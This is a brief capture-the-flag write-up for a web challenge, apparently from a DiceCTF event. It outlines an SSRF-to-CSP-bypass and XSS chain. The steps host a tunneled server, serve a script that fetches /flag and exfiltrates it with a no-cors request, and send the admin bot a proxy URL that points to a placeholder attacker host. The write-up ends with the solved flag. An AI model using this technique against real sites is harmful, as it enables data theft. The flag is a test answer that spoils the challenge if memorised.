# mirror-temple - baby-rsa

Vulnerability: Full-Read SSRF to CSP Bypass & XSS.

->Spin up a local Python server and tunnel it to the internet (e.g., localhost.run)

->Host an HTML file on this server containing <script src="/exploit.js"></script>.

->Host exploit.js with code to fetch /flag and exfiltrate it back to the python server using {mode: 'no-cors'} to bypass the connect-src 'self' CSP rule.

->Send the Admin Bot the payload: http://localhost:8080/proxy?url=YOUR_TUNNEL/exploit.html.

->The proxy securely loads your HTML, bypassing Trusted Types, while the browser executes your wildcard JavaScript, leaking the flag to your terminal.

flag:`dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_eht_evif_si_emit_eht_krad_si_moor_eht} `

Compiled by: yappare
Solved by: Ha1qal